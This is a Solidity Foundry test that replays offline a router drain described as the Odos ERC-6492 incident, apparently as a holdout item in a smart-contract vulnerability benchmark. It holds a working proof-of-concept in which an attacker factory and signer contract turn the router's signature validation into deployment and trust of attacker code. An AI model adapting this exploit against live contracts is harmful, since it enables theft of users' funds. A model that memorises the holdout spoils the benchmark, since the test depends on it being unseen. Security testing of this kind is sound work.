// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {OdosLimitOrderRouterClone} from
    "../fixtures/signature-phishing/b-incident/OdosLimitOrderRouterClone.sol";

/// @title signature-phishing (b) real-incident HOLDOUT: Odos limit-order-router ERC-6492 validation drain.
/// @notice Minimized OFFLINE replay (no live RPC) of the 2025-01-23 Odos router drain (~$50K on Base, per
///         OpenZeppelin). The router inlined the ERC-6492 reference validator instead of calling a separate
///         deployed one: in the counterfactual branch it low-level-calls a `factory` with `factoryCalldata`,
///         BOTH decoded from the attacker-supplied `signature` - an arbitrary call from the router's context
///         during signature validation. Faithful to ERC-6492: the signer is a not-yet-deployed CREATE2
///         address, so `signer.code.length == 0` forces the deploy branch; the attacker's factory call
///         deploys ATTACKER-CHOSEN code at that trusted address (a contract that returns the ERC-1271 magic
///         value), so validation then "succeeds" trusting the attacker's signer. The arbitrary code runs
///         from the router-driven call: proven by a persistent Recorder the deployed signer touches, which
///         survives because the (now code-bearing) signer makes the final check return MAGIC and the frame
///         does not revert. The verdict is derived from the real outcome, not hardcoded. HOLDOUT (label=vuln).
///         Incident facts/sources: see fixture PROVENANCE.md.
contract OdosErc6492IncidentTest is Test {
    bytes4 private constant MAGIC = 0x1626ba7e;

    function _report(string memory target, bool drained) internal pure {
        console.log(
            string.concat(
                "[signature-phishing] target=", target, " verdict=", drained ? "VULNERABLE" : "BLOCKED"
            )
        );
    }

    function test_odosErc6492CounterfactualCall_isDrained() public {
        OdosLimitOrderRouterClone router = new OdosLimitOrderRouterClone();
        Recorder recorder = new Recorder();
        EvilFactory factory = new EvilFactory();

        // Counterfactual signer: CREATE2 address of ATTACKER-CHOSEN code, not yet deployed.
        // signer.code.length == 0 at call time forces the ERC-6492 deploy branch.
        bytes32 salt = keccak256("odos-6492");
        bytes32 initCodeHash =
            keccak256(abi.encodePacked(type(AttackerSigner).creationCode, abi.encode(address(recorder))));
        address signer = vm.computeCreate2Address(salt, initCodeHash, address(factory));
        assertEq(signer.code.length, 0, "precondition: signer is counterfactual (no code yet)");
        assertFalse(recorder.pwned(), "precondition: attacker code has not run");

        // Attacker-supplied signature: factory + factoryCalldata are attacker-controlled, so the router
        // is coerced into deploying the attacker's signer during validation (the arbitrary call).
        bytes memory factoryCalldata = abi.encodeCall(EvilFactory.deploy, (salt, address(recorder)));
        bytes memory inner = hex"";
        bytes memory signature = abi.encode(signer, address(factory), factoryCalldata, inner);

        bytes32 hash = keccak256("order");
        bytes4 ret = router.isValidSigImpl(hash, signature);

        // Drain surface: the attacker's code was deployed+run from the router-driven call, and the router
        // then trusts the attacker-controlled signer (returns MAGIC).
        bool drained = recorder.pwned() && signer.code.length > 0 && ret == MAGIC;
        _report("odos-erc6492-victim", drained);

        assertTrue(
            drained,
            "caller-supplied ERC-6492 factory should deploy+trust attacker code from the router during validation"
        );
    }
}

/// @dev Persistent witness: records that attacker-chosen code executed as a result of router validation.
contract Recorder {
    bool public pwned;

    function mark() external {
        pwned = true;
    }
}

/// @dev Attacker-chosen signer deployed counterfactually; constructor touches the Recorder (proving the
///      arbitrary code ran) and it returns the ERC-1271 magic value so the router trusts it.
contract AttackerSigner {
    constructor(address recorder) {
        Recorder(recorder).mark();
    }

    function isValidSignature(bytes32, bytes memory) external pure returns (bytes4) {
        return 0x1626ba7e;
    }
}

/// @dev Attacker factory invoked by the router during validation; CREATE2-deploys the attacker's signer.
contract EvilFactory {
    function deploy(bytes32 salt, address recorder) external returns (address) {
        return address(new AttackerSigner{salt: salt}(recorder));
    }
}
